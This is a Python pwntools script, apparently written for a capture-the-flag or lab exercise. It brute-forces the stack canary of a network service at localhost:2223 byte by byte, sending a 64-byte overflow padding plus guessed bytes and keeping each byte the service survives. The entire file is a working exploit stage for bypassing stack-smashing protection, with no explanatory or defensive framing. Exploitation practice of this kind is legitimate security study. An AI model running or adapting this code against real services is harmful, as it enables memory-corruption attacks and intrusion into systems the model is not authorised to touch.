from pwn import *
import time
import struct

PADDING = 64
canary = [0x00]

for cb in range(3):

    currentByte = 0x00
    for i in range(255):

        print ("[+] Trying %s (Byte #%d)..." % (hex(currentByte), cb + 2))

        r = remote("localhost", 2223)
        DATA = "A" * PADDING
        DATA += "".join([struct.pack("B", c) for c in canary])
        DATA += struct.pack("B", currentByte)

        r.clean()
        r.send(DATA)

        received = ""
        try:
            received = r.recvuntil("OK")
        except EOFError:
            print ("Process Died")
        finally:
            r.close()

        if "OK" in received:
            canary.append(currentByte)
            print ("\n[*] Byte #%d is %s\n" % (cb + 2, hex(currentByte)))
            currentByte = 0
            break
        else:
            currentByte += 1

print ("Found Canary:")
print (" ".join([hex(c) for c in canary]))
